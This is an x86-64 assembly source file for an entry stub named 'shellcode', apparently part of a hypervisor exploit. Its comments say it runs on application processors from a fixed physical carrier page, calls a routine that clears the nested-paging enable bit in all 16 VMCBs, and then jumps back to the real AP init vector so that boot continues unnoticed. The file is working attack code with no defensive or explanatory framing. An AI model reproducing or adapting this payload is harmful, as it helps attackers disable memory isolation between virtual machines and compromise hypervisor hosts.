/* shellcode_ap entry -- the AP payload that clears NESTED_CTRL.NP_ENABLE on all 16 VMCBs.
 *
 * Placed at the carrier page (physical 0x3FFFF000); the parameter block lives at +0xF00, so
 * the stack setup below is what makes `page+0xF00` the argument pointer. Do not reorder:
 * this file must be linked FIRST so that `lea rsp,[rip+0xef9]` (7 + 0xef9 = 0xf00) lands on
 * the parameter block.
 *
 * Layout: page+0x000 code, page+0x400 scratch, page+0xF00 parameters, page+0xF40+ results.
 * The result block sits ABOVE the params on purpose -- everything below 0xF00 is stack. */

.intel_syntax noprefix
.text
.global shellcode
.type shellcode, @function

shellcode:
    lea     rsp, [rip + 0xef9]          /* rsp = param block (7 + 0xef9 = 0xf00) */
    push    rbx                         /* save HV rbx */
    push    rsi                         /* save HV rsi */
    push    rdi                         /* save core idx */
    sub     rsp, 8                      /* realign to 16-byte boundary */
    lea     rbx, [rsp + 0x20]
    mov     rdi, rbx                    /* arg0 = param block */
    call    ap_main
    mov     rcx, qword ptr [rbx]        /* param[0] = the real AP init vector */
    add     rsp, 8
    pop     rdi
    pop     rsi
    pop     rbx
    jmp     rcx                         /* hand the AP back to normal bringup */
.size shellcode, .-shellcode

.section .note.GNU-stack,"",@progbits
